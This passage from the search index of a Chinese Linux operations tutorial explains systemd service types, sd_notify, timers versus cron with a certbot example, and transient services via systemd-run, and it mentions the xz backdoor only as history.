\u200b\u5b58\u5728\u200b\u3001\u200b\u6240\u200b\u6307\u5b9a\u200b\u7684\u200b\u547d\u4ee4\u200b\u5b58\u5728\u200b\u4e14\u200b\u53ef\u200b\u6267\u884c\u200b\u7b49\u200b\u3002 \u200b\u56e0\u6b64\u200b\u73b0\u4ee3\u200b\u7684\u200b\u670d\u52a1\u200b\u5e94\u8be5\u200b\u5c3d\u91cf\u200b\u4f7f\u7528\u200b <code>Type=exec</code>\u3002</p> forking <p>\u200b\u4e00\u4e9b\u200b\u4f20\u7edf\u200b\u7684\u200b\u670d\u52a1\u200b\u4f1a\u200b\u4f7f\u7528\u200b\u8fd9\u79cd\u200b\u65b9\u5f0f\u200b\uff0c\u200b\u542f\u52a8\u200b\u547d\u4ee4\u200b\u4f1a\u200b fork \u200b\u51fa\u200b\u4e00\u4e2a\u200b\u5b50\u200b\u8fdb\u7a0b\u200b\u7136\u540e\u200b\u9000\u51fa\u200b\uff0c\u200b\u5b9e\u9645\u200b\u670d\u52a1\u200b\u7531\u200b\u8fd9\u4e2a\u200b\u5b50\u200b\u8fdb\u7a0b\u200b\u63d0\u4f9b\u200b\u3002 \u200b\u8fd9\u79cd\u200b\u670d\u52a1\u200b\u9700\u8981\u200b\u914d\u7f6e\u200b <code>PIDFile=</code>\uff0c\u200b\u4ee5\u4fbf\u200b systemd \u200b\u80fd\u591f\u200b\u6b63\u786e\u200b\u8ffd\u8e2a\u200b\u670d\u52a1\u200b\u7684\u200b\u4e3b\u200b\u8fdb\u7a0b\u200b\u3002\u200b\u5f53\u200b <code>PIDFile=</code> \u200b\u6307\u5b9a\u200b\u7684\u200b\u6587\u4ef6\u200b\u5b58\u5728\u200b\u4e14\u200b\u5305\u542b\u200b\u4e00\u4e2a\u200b\u6709\u6548\u200b\u7684\u200b PID \u200b\u65f6\u200b\uff0csystemd \u200b\u8ba4\u4e3a\u200b\u670d\u52a1\u200b\u5df2\u7ecf\u200b\u542f\u52a8\u200b\u6210\u529f\u200b\u3002</p> oneshot <p>\u200b\u4e00\u6b21\u6027\u200b\u670d\u52a1\u200b\uff0c\u200b\u5373\u200b\u542f\u52a8\u200b\u540e\u200b\u8fd0\u884c\u200b\u4e00\u6b21\u200b <code>ExecStart=</code> \u200b\u547d\u4ee4\u200b\uff0c\u200b\u7136\u540e\u200b\u9000\u51fa\u200b\u3002 \u200b\u8fd9\u4e2a\u200b Type \u200b\u6709\u200b\u4e24\u79cd\u200b\u4f7f\u7528\u200b\u573a\u666f\u200b\uff1a</p> <ol> <li> <p>\u200b\u4e00\u6b21\u6027\u200b\u7684\u200b\u521d\u59cb\u5316\u200b\u6216\u8005\u200b\u6e05\u7406\u200b\u5de5\u4f5c\u200b\u3001\u200b\u6216\u8005\u200b\u6539\u53d8\u200b\u7cfb\u7edf\u200b\u72b6\u6001\u200b\u7684\u200b\u547d\u4ee4\u200b\u7b49\u200b\uff08\u200b\u5982\u200b\u4e00\u4e9b\u200b <code>ip</code> \u200b\u547d\u4ee4\u200b\uff09\u3002</p> <p>\u200b\u5728\u200b\u8fd9\u4e2a\u200b\u573a\u666f\u200b\u4e0b\u200b\uff0c\u200b\u4f60\u200b\u5f88\u200b\u53ef\u80fd\u200b\u4e5f\u200b\u60f3\u200b\u540c\u65f6\u200b\u8bbe\u7f6e\u200b <code>RemainAfterExit=yes</code>\uff0c\u200b\u8fd9\u6837\u200b\u914d\u7f6e\u200b\u7684\u200b\u547d\u4ee4\u200b\u6267\u884c\u200b\u5b8c\u6210\u200b\u540e\u200b\u4f1a\u200b\u4e00\u76f4\u200b\u4fdd\u6301\u200b active \u200b\u72b6\u6001\u200b\u3002</p> </li> <li> <p>\u200b\u548c\u200b timer \u200b\u914d\u5408\u200b\u4f7f\u7528\u200b\uff0c\u200b\u5373\u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\u3002</p> </li> </ol> notify \u200b\u548c\u200b dbus <p>\u200b\u7c7b\u4f3c\u200b <code>simple</code> \u200b\u548c\u200b <code>exec</code>\uff0c\u200b\u4f46\u662f\u200b\u670d\u52a1\u200b\u4f1a\u200b\u5728\u200b\u542f\u52a8\u200b\u5b8c\u6210\u200b\u540e\u200b\u4e3b\u52a8\u200b\u901a\u77e5\u200b systemd\u3002 \u200b\u4e0e\u200b\u524d\u9762\u200b\u7684\u200b\u7c7b\u578b\u200b\u4e0d\u540c\u200b\u7684\u200b\u662f\u200b\uff0c\u200b\u8fd9\u200b\u7c7b\u200b\u670d\u52a1\u200b\u9700\u8981\u200b\u7a0b\u5e8f\u200b\u4e3b\u52a8\u200b\u652f\u6301\u200b <code>sd_notify</code> \u200b\u6216\u8005\u200b D-Bus \u200b\u63a5\u53e3\u200b\u3002</p> sd_notify <p>sd_notify(3) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u975e\u5e38\u7b80\u5355\u200b\u7684\u200b\u534f\u8bae\u200b\u3002Systemd \u200b\u5bf9\u4e8e\u200b\u6807\u6ce8\u200b\u81ea\u5df1\u200b\u652f\u6301\u200b <code>notify</code> \u200b\u7684\u200b\u670d\u52a1\u200b\uff0c\u200b\u4f1a\u200b\u901a\u8fc7\u200b\u73af\u5883\u53d8\u91cf\u200b <code>NOTIFY_SOCKET</code> \u200b\u7ed9\u200b\u5e94\u7528\u200b\u63d0\u4f9b\u200b\u4e00\u4e2a\u200b UNIX socket \u200b\u5730\u5740\u200b\u3002\u200b\u5e94\u7528\u200b\u5411\u200b\u8fd9\u4e2a\u200b socket \u200b\u53d1\u9001\u200b\u6307\u5b9a\u200b\u7684\u200b\u5b57\u7b26\u4e32\u200b\u6765\u200b\u901a\u77e5\u200b systemd \u200b\u81ea\u8eab\u200b\u7684\u200b\u72b6\u6001\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u670d\u52a1\u200b\u5b8c\u6574\u200b\u542f\u52a8\u200b\u4e4b\u540e\u200b\uff0c\u200b\u5e94\u7528\u200b\u53ef\u4ee5\u200b\u53d1\u9001\u200b <code>READY=1</code> \u200b\u6765\u200b\u901a\u77e5\u200b systemd \u200b\u670d\u52a1\u200b\u5df2\u7ecf\u200b\u6210\u529f\u200b\u542f\u52a8\u200b\u3002</p> <p>\u200b\u901a\u77e5\u200b\u7684\u200b\u903b\u8f91\u200b\u5f88\u200b\u7b80\u5355\u200b\uff0c\u200b\u5373\u4f7f\u200b\u4e0d\u200b\u4f7f\u7528\u200b systemd \u200b\u7684\u200b C \u200b\u5e93\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u81ea\u5df1\u200b\u624b\u5199\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5e2e\u52a9\u200b\u6587\u6863\u200b\u4e5f\u200b\u63d0\u4f9b\u200b\u4e86\u200b C \u200b\u548c\u200b Python \u200b\u7684\u200b\u6837\u4f8b\u200b\u4ee3\u7801\u200b\u3002\u200b\u503c\u5f97\u4e00\u63d0\u7684\u662f\u200b\uff0c2024 \u200b\u5e74\u200b\u8f70\u52a8\u4e00\u65f6\u200b\u7684\u200b xz \u200b\u540e\u95e8\u200b\u4e8b\u4ef6\u200b\u4e4b\u6240\u4ee5\u200b\u80fd\u591f\u200b\u5f71\u54cd\u200b sshd \u200b\u7684\u200b\u903b\u8f91\u200b\uff0c\u200b\u5c31\u662f\u200b\u56e0\u4e3a\u200b\u90e8\u5206\u200b\u53d1\u884c\u7248\u200b\u5728\u200b\u7f16\u8bd1\u200b OpenSSH \u200b\u65f6\u200b\u94fe\u63a5\u200b\u4e86\u200b libsystemd \u200b\u6765\u200b\u4f7f\u7528\u200b <code>sd_notify()</code>\uff0c\u200b\u800c\u200b libsystemd \u200b\u53c8\u200b\u4f9d\u8d56\u4e8e\u200b\uff08\u200b\u88ab\u200b\u690d\u5165\u200b\u540e\u95e8\u200b\u7684\u200b\uff09liblzma\u3002</p>"},{"location":"ops/service/#timers","title":"\u5b9a\u65f6\u200b\u4efb\u52a1","text":"<p>Systemd \u200b\u63d0\u4f9b\u200b\u4e86\u200b timer \u200b\u7c7b\u578b\u200b\u7684\u200b unit\uff0c\u200b\u7528\u4e8e\u200b\u5b9a\u65f6\u200b\u6267\u884c\u200b\u4efb\u52a1\u200b\u3002\u200b\u4e00\u4e2a\u200b timer unit \u200b\u901a\u5e38\u200b\u4f1a\u200b\u5bf9\u5e94\u200b\u4e00\u4e2a\u200b service unit\uff0c\u200b\u5373\u200b\u5728\u200b\u6307\u5b9a\u200b\u7684\u200b\u65f6\u95f4\u200b\u70b9\u200b\u6216\u8005\u200b\u65f6\u95f4\u200b\u95f4\u9694\u200b\u89e6\u53d1\u200b service \u200b\u7684\u200b\u542f\u52a8\u200b\u3002</p> <p>\u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u66f4\u200b\u5e38\u89c1\u200b\u7684\u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\u65b9\u6848\u200b CRON\uff0csystemd timers \u200b\u5177\u6709\u200b\u4ee5\u4e0b\u200b\u4f18\u70b9\u200b\uff1a</p> <ul> <li> <p>\u200b\u66f4\u200b\u4e30\u5bcc\u200b\u7684\u200b\u65f6\u95f4\u200b\u8868\u8fbe\u5f0f\u200b\uff0c\u200b\u9664\u4e86\u200b\u7b49\u4ef7\u200b\u4e8e\u200b crontab \u200b\u7684\u200b <code>OnCalendar=</code> \u200b\u65f6\u95f4\u200b\u4e4b\u5916\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>OnUnitActiveSec=</code>\uff08\u200b\u670d\u52a1\u200b\u542f\u52a8\u200b\u540e\u200b\uff09\u3001<code>OnBootSec=</code>\uff08\u200b\u7cfb\u7edf\u542f\u52a8\u200b\u540e\u200b\uff09\u200b\u7b49\u200b\u6307\u5b9a\u200b\u5176\u4ed6\u200b\u65f6\u95f4\u200b\u8ba1\u7b97\u200b\u65b9\u5f0f\u200b\u3002</p> <ul> <li> <p>\u200b\u4f8b\u5982\u200b\uff0c<code>systemd-tmpfiles-clean.timer</code> \u200b\u5c31\u662f\u200b\u5728\u200b\u7cfb\u7edf\u542f\u52a8\u200b\u540e\u200b 15 \u200b\u5206\u949f\u200b\u89e6\u53d1\u200b\u4e00\u6b21\u200b <code>systemd-tmpfiles-clean.service</code>\uff0c\u200b\u7136\u540e\u200b\u6bcf\u5929\u200b\u89e6\u53d1\u200b\u4e00\u6b21\u200b\uff0c\u200b\u7528\u4e8e\u200b\u6e05\u7406\u200b\u4e34\u65f6\u6587\u4ef6\u200b\u3002</p> /lib/systemd/system/systemd-tmpfiles-clean.timer<pre><code>[Timer]\nOnBootSec=15min\nOnUnitActiveSec=1d\n</code></pre> </li> <li> <p>\u200b\u5982\u679c\u200b\u4e0d\u200b\u4f7f\u7528\u200b <code>OnCalendar=</code> \u200b\u7684\u8bdd\u200b\uff0c\u200b\u4e00\u822c\u200b\u5e38\u7528\u200b\u7684\u200b\u6a21\u5f0f\u200b\u662f\u200b\uff1a\u200b\u4f7f\u7528\u200b <code>OnActiveSec=</code>\uff08timer \u200b\u88ab\u200b\u6fc0\u6d3b\u200b\u540e\u200b\uff09\u3001<code>OnBootSec=</code> \u200b\u6216\u200b <code>OnStartupSec=</code>\uff08systemd \u200b\u542f\u52a8\u200b\u540e\u200b\uff09\u200b\u6765\u200b\u9996\u6b21\u200b\u89e6\u53d1\u200b\uff0c\u200b\u7136\u540e\u200b\u4f7f\u7528\u200b <code>OnUnitActiveSec=</code> \u200b\u6765\u200b\u4fdd\u8bc1\u200b\u540e\u7eed\u200b\u5b9a\u65f6\u200b\u89e6\u53d1\u200b\u3002\u200b\u56e0\u4e3a\u200b <code>OnActiveSec=</code>\u3001<code>OnBootSec=</code> \u200b\u548c\u200b <code>OnStartupSec=</code> \u200b\u53ea\u4f1a\u200b\u89e6\u53d1\u200b\u4e00\u6b21\u200b\u670d\u52a1\u200b\u542f\u52a8\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u5b9e\u73b0\u200b\u5b9a\u65f6\u200b\u542f\u52a8\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u9700\u8981\u200b\u989d\u5916\u200b\u8bbe\u7f6e\u200b\u4ee5\u200b\u670d\u52a1\u200b\u542f\u52a8\u200b\u540e\u200b\u4e3a\u200b\u57fa\u51c6\u200b\u7684\u200b\u5b9a\u65f6\u5668\u200b\uff0c\u200b\u5373\u200b <code>OnUnitActiveSec=</code>\u3002\u200b\u800c\u200b\u5982\u679c\u200b\u6ca1\u6709\u200b\u524d\u8005\u200b\u7684\u8bdd\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5c31\u200b\u5fc5\u987b\u200b\u8981\u200b\u624b\u52a8\u200b\u542f\u52a8\u200b\u5bf9\u5e94\u200b\u7684\u200b\u670d\u52a1\u200b\u4e4b\u540e\u200b\uff0ctimer \u200b\u624d\u200b\u4f1a\u200b\u6709\u6548\u200b\u3002\u200b\u56e0\u6b64\u200b\u8fd9\u200b\u4e00\u7c7b\u200b timer \u200b\u4f1a\u200b\u540c\u65f6\u200b\u5305\u542b\u200b\u4e24\u4e2a\u200b\u5b9a\u65f6\u200b\u89c4\u5219\u200b\u3002</p> </li> </ul> </li> <li> <p>\u200b\u66f4\u52a0\u200b\u7cbe\u786e\u200b\u7684\u200b\u65f6\u95f4\u200b\u63a7\u5236\u200b\uff0c\u200b\u901a\u8fc7\u200b <code>AccuracySec=</code> \u200b\u53ef\u4ee5\u200b\u652f\u6301\u200b\u79d2\u7ea7\u200b\u751a\u81f3\u200b\u66f4\u7ec6\u200b\u7684\u200b\u65f6\u95f4\u200b\u7cbe\u5ea6\u200b\u3002     \u200b\u4e00\u822c\u200b\u4e0d\u200b\u63a8\u8350\u200b\u5c0f\u4e8e\u200b 1 \u200b\u5206\u949f\u200b\u7684\u200b\u65f6\u95f4\u200b\u7cbe\u5ea6\u200b\uff0c\u200b\u5426\u5219\u200b\u7cfb\u7edf\u200b\u8ba1\u65f6\u5668\u200b\u9700\u8981\u200b\u9891\u7e41\u200b\u5524\u9192\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5f71\u54cd\u200b\u7cfb\u7edf\u200b\u6027\u80fd\u200b\u3002\u200b\u8fd9\u200b\u4e00\u70b9\u200b\u8003\u8651\u200b\u4e0e\u200b cron \u200b\u662f\u200b\u76f8\u540c\u200b\u7684\u200b\u3002</p> </li> <li><code>RandomizedDelaySec=</code> \u200b\u53ef\u4ee5\u200b\u914d\u7f6e\u200b\u6bcf\u6b21\u200b\u89e6\u53d1\u200b\u65f6\u200b\u968f\u673a\u200b\u5ef6\u8fdf\u200b\u7684\u200b\u65f6\u95f4\u200b\uff0c\u200b\u907f\u514d\u200b\u5927\u91cf\u200b\u670d\u52a1\u200b\u5728\u200b\u540c\u4e00\u65f6\u95f4\u200b\u70b9\u200b\u542f\u52a8\u200b\u3002     \u200b\u8fd9\u200b\u5728\u200b\u4f7f\u7528\u200b\u540c\u200b\u4e00\u4efd\u200b\u7cfb\u7edf\u200b\u955c\u50cf\u200b\u90e8\u7f72\u200b\u5927\u91cf\u200b\u865a\u62df\u673a\u200b\u6216\u200b\u7c7b\u4f3c\u200b\u573a\u666f\u200b\u4e0b\u200b\u975e\u5e38\u200b\u6709\u7528\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u907f\u514d\u200b\u5927\u91cf\u200b\u8ba1\u5212\u200b\u4efb\u52a1\u200b\u540c\u65f6\u200b\u89e6\u53d1\u200b\uff0c\u200b\u5bfc\u81f4\u7cfb\u7edf\u200b\u8d1f\u8f7d\u200b\u8fc7\u9ad8\u200b\u3002</li> <li><code>Persistent=</code> \u200b\u53ef\u4ee5\u200b\u786e\u4fdd\u200b\u5982\u679c\u200b\u56e0\u200b\u5173\u673a\u200b\u3001\u200b\u91cd\u542f\u200b\u7b49\u200b\u539f\u56e0\u200b\u9519\u8fc7\u200b\u4e86\u200b\u8bbe\u5b9a\u200b\u65f6\u95f4\u200b\uff0c\u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\u4f1a\u200b\u5728\u200b\u4e0b\u6b21\u200b\u7cfb\u7edf\u542f\u52a8\u200b\u540e\u200b\u4f1a\u200b\u7acb\u5373\u200b\u6267\u884c\u200b\u3002</li> <li>\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>systemctl enable</code> \u200b\u548c\u200b <code>systemctl disable</code> \u200b\u542f\u7528\u200b\u548c\u200b\u7981\u7528\u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\uff0c\u200b\u800c\u200b\u65e0\u9700\u200b\u4fee\u6539\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u3002     \u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>systemctl status</code> \u200b\u67e5\u770b\u200b timer \u200b\u548c\u200b service \u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u4ee5\u53ca\u200b <code>journalctl</code> \u200b\u67e5\u770b\u200b\u65e5\u5fd7\u200b\u3002</li> <li>\u200b\u57fa\u4e8e\u200b service \u200b\u800c\u200b\u4e0d\u662f\u200b\u7b80\u5355\u200b\u8fd0\u884c\u200b\u547d\u4ee4\u200b\u7684\u200b\u4f18\u70b9\u200b\uff1a<ul> <li>\u200b\u4eab\u53d7\u200b service \u200b\u7684\u200b\u5168\u90e8\u200b\u597d\u5904\u200b\uff0c\u200b\u5982\u200b\u4f9d\u8d56\u200b\u7ba1\u7406\u200b\u3001\u200b\u73af\u5883\u53d8\u91cf\u200b\u3001\u200b\u81ea\u52a8\u200b\u91cd\u542f\u200b\u7b49\u200b\uff0c\u200b\u4e5f\u200b\u5305\u62ec\u200b\u5b89\u5168\u200b\u4e0e\u200b\u9694\u79bb\u200b\u7b49\u200b\u9ad8\u7ea7\u200b\u529f\u80fd\u200b\u3002</li> <li>\u200b\u5229\u7528\u200b service \u200b\u5355\u200b\u5b9e\u4f8b\u200b\u7684\u200b\u7279\u6027\u200b\uff0c\u200b\u907f\u514d\u200b\u4e00\u4e2a\u200b\u4efb\u52a1\u200b\u540c\u65f6\u200b\u8fd0\u884c\u200b\u591a\u4efd\u200b\u5b9e\u4f8b\u200b\uff0c\u200b\u5373\u5f53\u200b\u4efb\u52a1\u200b\u5df2\u7ecf\u200b\u5728\u200b\u8fd0\u884c\u200b\u800c\u200b\u6ca1\u6709\u200b\u7ed3\u675f\u200b\u65f6\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u7ee7\u7eed\u200b\u542f\u52a8\u200b\u65b0\u200b\u7684\u200b\u8fdb\u7a0b\u200b\u3002\u200b\u5728\u200b cron \u200b\u4e2d\u200b\uff0c\u200b\u8fd9\u200b\u901a\u5e38\u200b\u9700\u8981\u200b\u501f\u52a9\u200b\u989d\u5916\u200b\u7684\u200b\u5de5\u5177\u200b\u5b9e\u73b0\u200b\uff0c\u200b\u5982\u200b <code>flock(1)</code>\u3002</li> </ul> </li> </ul> <p>Timers \u200b\u7684\u200b\u4e3b\u8981\u200b\u7f3a\u70b9\u200b\u662f\u200b\uff1a</p> <ul> <li>\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u7e41\u7410\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\u81f3\u5c11\u200b\u9700\u8981\u200b\u521b\u5efa\u200b\u4e24\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u662f\u200b timer unit\uff0c\u200b\u4e00\u4e2a\u200b\u662f\u200b\u5bf9\u5e94\u200b\u7684\u200b service unit\u3002\u200b\u76f8\u6bd4\u200b\u4e8e\u200b\u5728\u200b crontab \u200b\u4e2d\u200b\u6dfb\u52a0\u200b\u4e00\u884c\u200b\u914d\u7f6e\u200b\uff0c\u200b\u52a8\u8f84\u200b\u6570\u5341\u884c\u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u5b9e\u5728\u200b\u4e0d\u591f\u200b\u65b9\u4fbf\u200b\u3002</li> <li>\u200b\u6ca1\u6709\u200b cron \u200b\u7684\u200b\u90ae\u4ef6\u200b\u901a\u77e5\u200b\u529f\u80fd\u200b\u3002\u200b\u4f46\u662f\u200b service \u200b\u7684\u200b\u8f93\u51fa\u200b\u53ef\u4ee5\u200b\u8bb0\u5f55\u200b\u5230\u200b\u65e5\u5fd7\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>journalctl</code> \u200b\u67e5\u770b\u200b\uff1b\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4e3a\u200b service \u200b\u6307\u5b9a\u200b <code>StandardOutput=</code> \u200b\u548c\u200b <code>StandardError=</code> \u200b\u624b\u52a8\u200b\u91cd\u5b9a\u5411\u200b\u8f93\u51fa\u200b\u3002</li> </ul> <p>\u200b\u53e6\u5916\u200b\uff0c\u200b\u7b2c\u4e09\u65b9\u200b\u5f00\u53d1\u200b\u7684\u200b systemd-cron \u200b\u9879\u76ee\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e00\u4e2a\u200b cron \u200b\u7684\u200b\u66ff\u4ee3\u200b\u65b9\u6848\u200b\uff0c\u200b\u5b83\u200b\u4f7f\u7528\u200b systemd \u200b\u7684\u200b generator \u200b\u63a5\u53e3\u200b\u5c06\u200b crontab \u200b\u7ffb\u8bd1\u6210\u200b systemd timer \u200b\u548c\u200b service\uff0c\u200b\u7136\u540e\u200b\u7531\u200b systemd \u200b\u8d1f\u8d23\u200b\u8fd9\u4e9b\u200b timer \u200b\u548c\u200b service \u200b\u7684\u200b\u89e6\u53d1\u200b\u548c\u200b\u8fd0\u884c\u200b\u3002</p>"},{"location":"ops/service/#create-timer","title":"\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u5b9a\u65f6\u200b\u4efb\u52a1","text":"<p>\u200b\u5982\u4e0a\u6240\u8ff0\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\u5305\u542b\u200b\u4e24\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u4e00\u4e2a\u200b\u662f\u200b timer unit\uff0c\u200b\u4e00\u4e2a\u200b\u662f\u200b\u5bf9\u5e94\u200b\u7684\u200b service unit\u3002\u200b\u4e0b\u9762\u200b\u4ee5\u200b certbot \u200b\u7684\u200b\u914d\u7f6e\u6587\u4ef6\u200b\u4e3a\u4f8b\u200b\uff0c\u200b\u8bf4\u660e\u200b\u5982\u4f55\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u5b9a\u65f6\u200b\u4efb\u52a1\u200b\u3002</p> <p>\u200b\u9996\u5148\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b service\uff0c\u200b\u9700\u8981\u200b\u6ce8\u610f\u200b\u7684\u200b\u662f\u200b <code>Type=oneshot</code>\uff0c\u200b\u5e76\u4e14\u200b\u4e0d\u80fd\u200b\u4f7f\u7528\u200b <code>RemainAfterExit=yes</code>\uff08\u200b\u4e00\u822c\u200b\u5c06\u200b\u5176\u200b\u5ffd\u7565\u200b\u5373\u53ef\u200b\uff0c\u200b\u5b83\u200b\u7684\u200b\u9ed8\u8ba4\u503c\u200b\u662f\u200b no\uff09\u3002</p> /lib/systemd/system/certbot.service<pre><code>[Unit]\nDescription=Certbot\nDocumentation=file:///usr/share/doc/python-certbot-doc/html/index.html\nDocumentation=https://certbot.eff.org/docs\n\n[Service]\nType=oneshot\nExecStart=/usr/bin/certbot -q renew\nPrivateTmp=true\n</code></pre> <p>\u200b\u63a5\u4e0b\u6765\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b timer\uff0c\u200b\u6307\u5b9a\u200b\u89e6\u53d1\u200b\u65f6\u95f4\u200b\uff0c\u200b\u5e76\u200b\u6309\u200b\u9700\u200b\u542f\u7528\u200b <code>Persistent=</code>\u3002</p> /lib/systemd/system/certbot.timer<pre><code>[Unit]\nDescription=Run certbot twice daily\n\n[Timer]\nOnCalendar=*-*-* 00,12:00:00\nRandomizedDelaySec=43200\nPersistent=true\n\n[Install]\nWantedBy=timers.target\n</code></pre> <p>\u200b\u6b64\u65f6\u200b <code>certbot.timer</code> \u200b\u4f1a\u200b\u81ea\u52a8\u200b\u89e6\u53d1\u200b\u540c\u540d\u200b\u7684\u200b service\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b <code>certbot.service</code>\u3002</p> <p>\u200b\u5728\u200b\u7f16\u8f91\u200b\u5b8c\u200b\u4e24\u4e2a\u200b\u6587\u4ef6\u200b\u4e4b\u540e\u200b\uff0c\u200b\u9700\u8981\u200b\u8fd0\u884c\u200b <code>systemctl daemon-reload</code> \u200b\u4f7f\u200b systemd \u200b\u91cd\u65b0\u200b\u52a0\u8f7d\u200b\u914d\u7f6e\u6587\u4ef6\u200b\uff0c\u200b\u7136\u540e\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>systemctl start certbot.timer</code> \u200b\u542f\u52a8\u200b\u5b9a\u65f6\u5668\u200b\uff0c\u200b\u6216\u8005\u200b\u4f7f\u7528\u200b <code>systemctl enable certbot.timer</code> \u200b\u8ba9\u200b\u5176\u200b\u5f00\u673a\u200b\u542f\u52a8\u200b\u3002</p>"},{"location":"ops/service/#transient-service","title":"\u4e34\u65f6\u200b\u670d\u52a1","text":"<p>systemd \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u4e34\u65f6\u200b\u670d\u52a1\u200b\u7684\u200b\u652f\u6301\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5728\u200b\u9700\u8981\u200b\u65f6\u200b\u52a8\u6001\u521b\u5efa\u200b\u548c\u200b\u542f\u52a8\u200b\u670d\u52a1\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u9700\u8981\u200b\u4e8b\u5148\u200b\u7f16\u5199\u200b <code>.service</code> \u200b\u6587\u4ef6\u200b\uff0c\u200b\u8fd9\u200b\u5bf9\u4e8e\u200b\u4e00\u4e9b\u200b\u4e34\u65f6\u200b\u4efb\u52a1\u200b\u6216\u200b\u4e00\u6b21\u6027\u200b\u64cd\u4f5c\u200b\u975e\u5e38\u200b\u6709\u7528\u200b\u3002</p> <p><code>systemd-run</code> \u200b\u547d\u4ee4\u200b\u53ef\u4ee5\u200b\u521b\u5efa\u200b\u4e34\u65f6\u200b\u670d\u52a1\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u547d\u4ee4\u200b\u4f1a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u4e34\u65f6\u200b\u670d\u52a1\u200b\u5e76\u200b\u7acb\u5373\u200b\u542f\u52a8\u200b\uff1a</p> <pre><code>systemd-run --unit=my-sleep sleep 600\n</code></pre> <p>\u200b\u6b64\u540e\u200b\uff0c\u200b\u4f60\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>systemctl status my-sleep</code> \u200b\u67e5\u770b\u200b\u4e34\u65f6\u200b\u670d\u52a1\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u6216\u8005\u200b\u4f7f\u7528\u200b\u8bf8\u5982\u200b <code>systemctl stop</code> / <code>systemctl restart</code> \u200b\u7b49\u200b\u547d\u4ee4\u200b\u7ba1\u7406\u200b\u5176\u200b\u72b6\u6001\u200b\u4e86\u200b\u3002\u200b\u540c\u65f6\u200b\uff0c\u200b\u4f60\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>journalctl</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u8fdb\u7a0b\u200b\u7684\u200b\u8f93\u51fa\u200b\uff08\u200b\u89c1\u200b\u4e0b\u200b\uff09\u3002</p> <p>\u200b\u9ed8\u8ba4\u200b\u60c5\u51b5\u200b\u4e0b\u200b\uff0c\u200b\u5982\u679c\u200b\u4e34\u65f6\u200b\u670d\u52a1\u200b\u7684\u200b\u547d\u4ee4\u200b\u6b63\u5e38\u200b\u9000\u51fa\u200b\u4e86\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5bf9\u5e94\u200b\u7684\u200b\u670d\u52a1\u200b\u4f1a\u200b\u88ab\u200b\u56de\u6536\u200b\uff0c\u200b\u5373\u200b <code>systemctl status my-sleep</code> \u200b\u5c06\u4f1a\u200b\u663e\u793a\u200b service not found\u3002\u200b\u6b64\u65f6\u200b\u4f60\u200b\u4ecd\u7136\u200b\u53ef\u4ee5\u200b\u4f7f\u7528\u200b <code>journalctl</code> \u200b\u547d\u4ee4\u200b\u67e5\u770b\u200b\u65e5\u5fd7\u200b\uff0c\u200b\u56de\u6536\u200b\u670d\u52a1\u200b\u5e76\u200b\u4e0d\u4f1a\u200b\u6e05\u9664\u200b\u5176\u200b\u8fd0\u884c\u65e5\u5fd7\u200b\u3002<code>systemd-run</code> \u200b\u6709\u200b\u4e24\u4e2a\u200b\u53c2\u6570\u200b\u53ef\u4ee5\u200b\u6539\u53d8\u200b\u6b64\u200b\u9ed8\u8ba4\u200b\u884c\u4e3a\u200b\uff1a</p> <ul> <li><code>-r</code> \u200b\u53ef\u4ee5\u200b\u4f7f\u200b systemd \u200b\u5728\u200b\u8fdb\u7a0b\u200b\u6b63\u5e38\u200b\u9000\u51fa\u200b\u540e\u200b\u4ecd\u7136\u200b\u4fdd\u7559\u200b\u670d\u52a1\u200b\uff1b</li> <li><code>-G</code> \u200b\u53ef\u4ee5\u200b\u4f7f\u200b systemd 